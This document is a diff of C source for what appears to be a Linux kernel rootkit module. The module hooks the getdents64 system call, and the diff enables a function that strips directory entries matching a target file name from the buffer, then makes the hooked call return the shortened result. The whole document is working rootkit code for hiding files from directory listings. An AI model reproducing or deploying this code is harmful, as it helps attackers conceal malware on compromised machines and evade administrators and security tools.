@@ -77,24 +77,22 @@ unsigned long ** hook_syscall_table(void)
 static long hide_file64(char *f_name, struct linux_dirent64 __user *dirp, long count)
 {
     struct linux_dirent64 *dp;
-    long cur_addr, cur_reclen;
+    long cur_addr, cur_reclen, size, next_addr;
     char *ptr;
-    unsigned long size, next_addr;
-
+    
     for (cur_addr = 0; cur_addr < count; cur_addr += dp->d_reclen) {
-        ptr = (char *)dirp + cur_addr;
-        dp = (struct linux_dirent64 *)ptr;
+        dp = (struct linux_dirent64 *)((char *)dirp + cur_addr);
         
-//        if (strncmp(dp->d_name, f_name, sizeof(f_name)-1) == 0) {
-//            cur_reclen = dp->d_reclen;                              // Store the current length
-//            next_addr = (unsigned long)dp + dp->d_reclen;           // Next address = current+len
-//            size = (unsigned long)dirp + count - next_addr;        // Remain size = initial+size-next size
-//            
-//            memmove(dp, (void *)next_addr, size);                 // current dirent point to the next
-//            count -= cur_reclen;                                     // Modify the size
+        if (strncmp(dp->d_name, f_name, strlen(f_name)) == 0) {
+            cur_reclen = dp->d_reclen;                              // Store the current length
+            next_addr = (unsigned long)dp + dp->d_reclen;           // Next address = current+len
+            size = (unsigned long)dirp + count - next_addr;        // Remain size = initial+size-next size
             
-//              printk("Hide %s file success.\n", dp->d_name);
-//        }
+            memmove(dp, (void *)next_addr, size);                 // current dirent point to the next
+            count -= cur_reclen;                                     // Modify the size
+            
+            printk("Hide %s file success.\n", dp->d_name);
+        }
     }
 
     return count;
@@ -108,7 +106,7 @@ asmlinkage long fake_getdents64(unsigned int fd, struct linux_dirent64 __user *d
     rv2 = hide_file64(targetfile, dirp, rv);
     
     printk("Yes, faked the getdent! %d - %d", rv, rv2);
-    return rv;
+    return rv2;
 }
  
 static void lkm_exit(void)
